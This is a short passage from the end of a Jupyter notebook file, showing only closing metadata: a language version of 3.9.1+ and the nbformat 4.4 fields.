      "version": "3.9.1+"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}